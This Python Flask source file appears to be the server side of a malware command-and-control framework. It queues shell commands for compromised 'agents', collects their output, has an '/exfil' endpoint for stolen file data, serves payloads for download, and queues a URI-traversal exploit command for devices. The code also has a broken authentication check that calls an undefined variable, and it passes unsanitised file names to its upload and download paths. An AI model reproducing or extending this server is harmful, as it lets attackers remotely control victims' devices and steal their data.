import eventlet
eventlet.monkey_patch()

from flask import Flask, request, jsonify, abort, send_file, render_template
from flask_cors import CORS
from flask_socketio import SocketIO, emit
import os
import hmac, hashlib
from token_utils import verify_signature

app = Flask(__name__)
CORS(app)
socketio = SocketIO(app, cors_allowed_origins="*")

# In-memory command queue for demo (replace with DB in production)
device_commands = {}
device_outputs = {}

# === Auth Middleware (disabled temporarily for dev/testing) ===
@app.before_request
def check_auth():
    if request.path.startswith(("/get_command", "/set_command", "/post_output")):
        agent_id = request.headers.get("X-Agent-ID")
        sig = request.headers.get("X-Signature")
        if not agent_id or not sig or not verify_signature(agent_id_sig):
            abort(403)

# === Web Dashboard ===
@app.route("/")
def dashboard():
    return render_template("index.html")

# === Agent Registration ===
@app.route("/register", methods=["POST"])
def register():
    device_id = request.json.get("device_id")
    if device_id not in device_commands:
        device_commands[device_id] = "id"
        print(f"[+] New agent registered: {device_id}")
    return jsonify({"status": "registered"})

# === Poll-based C2 commands ===
@app.route("/get_command/<device_id>", methods=["GET"])
def get_command(device_id):
    cmd = device_commands.get(device_id, "")
    print(f"[>] Sending command to {device_id}: {cmd}")
    return jsonify({"cmd": cmd})

@app.route("/post_output", methods=["POST"])
def post_output():
    data = request.json
    device_id = data.get("device_id")
    output = data.get("output")
    print(f"[<] Output from {device_id}:\n{output}")
    device_outputs[device_id] = output
    return jsonify({"status": "ok"})

@app.route("/set_command", methods=["POST"])
def set_command():
    data = request.json
    device_id = data.get("device_id")
    command = data.get("command")
    device_commands[device_id] = command
    print(f"[!] Command for {device_id} set to: {command}")
    return jsonify({"status": "command set"})

# === File exfil endpoint ===
@app.route("/exfil", methods=["POST"])
def receive_file():
    content = request.data.decode()
    print(f"\n[EXFIL] Received file data:\n{content}\n")
    return jsonify({"status": "received"})

# === Exploits (e.g., URI Traversal) ===
@app.route("/exploit/uri_traversal", methods=["POST"])
def uri_traversal():
    data = request.json
    package = data.get("package")
    component = data.get("component")
    
    from modules import exploit_uri_traversal
    command = exploit_uri_traversal.generate_command(package, component)
    
    device_id = data.get("device_id")
    device_commands[device_id] = command
    return jsonify({"status": "queued", "command": command})

# === Payload Downloader ===
@app.route("/payloads/<filename>", methods=["GET"])
def get_payload(filename):
    payload_path = os.path.join("payloads", filename)
    if not os.path.exists(payload_path):
        return {"error": "File not found"}, 404
    return send_file(payload_path, mimetype="application/octet-stream")

# === File Upload to Server ===
@app.route("/upload", methods=["POST"])
def upload():
    file = request.files["file"]
    os.makedirs("uploads", exist_ok=True)
    file.save(os.path.join("uploads", file.filename))
    return jsonify({"status": "ok"})

# === WebSocket Event Handling ===
@socketio.on('connect')
def on_connect():
    print("[✓] Agent connected via WebSocket")

@socketio.on('command_result')
def on_command_result(data):
    print(f"[<] Result: {data}")

@socketio.on('register')
def register_agent(data):
    emit('command', {'cmd': 'id'})

if __name__ == "__main__":
    socketio.run(app, host="0.0.0.0", port=5000)
